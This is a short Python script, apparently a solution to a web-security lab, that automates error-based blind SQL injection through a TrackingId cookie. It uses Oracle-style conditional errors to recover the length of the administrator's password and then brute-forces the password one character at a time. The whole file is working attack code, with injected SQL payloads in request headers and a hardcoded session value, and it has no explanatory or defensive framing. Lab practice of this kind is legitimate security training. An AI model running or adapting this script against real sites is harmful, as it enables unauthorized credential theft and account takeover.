import requests
import sys

def main():
    checkParams()
    url = sys.argv[1]
    trackingId = "TrackingId=" + sys.argv[2]
    alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
    passLength = 1
    foundChar = False
    foundPass = ""
    
    # Find password length
    print("Finding password's length...")
    while True:
        passLengthHeader = {"Cookie": trackingId + "'  AND  ((SELECT 'a' from users where username='administrator' and LENGTH(password)>"+str(passLength)+")='a' OR to_char(1/0)='1') AND '1'='1;  session=T5owTP3q24KE1H1rLetE61k3ywCcljYr"}
        res = requests.get(url, headers = passLengthHeader)
        # print(passLength)
        # print(res.status_code)
        # print(passLengthHeader)
        if res.status_code == 500:
            break;
        passLength+=1
    print(f"Password is {passLength} characters long")
    
    # For password's length try every lowercase leter or number
    print("Comparing password characters...")
    for i in range(1,passLength+1):
        print("_" + str(i))
        for letter in alphabet:
            passCharsHeader = {'Cookie': trackingId + "' AND  (SUBSTR((SELECT password from users where username='administrator')," + str(i) + ",1)='" + letter + "' OR to_char(1/0)='1') AND '1'='1"}
            res = requests.get(url, headers = passCharsHeader)
            if res.status_code == 200:
                foundChar = True
                foundPass += letter
                print(foundPass)
                break;
                
        if foundChar == False:
            foundPass += "*"
            print(foundPass)
            
        foundChar = False
        
      
def checkParams():
    if len(sys.argv)<2:
        print("Please insert url as first parameter")
        sys.exit(0)
    if len(sys.argv)<3:
        print("Please insert TrackingId as second parameter")
        sys.exit(0)
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted by user')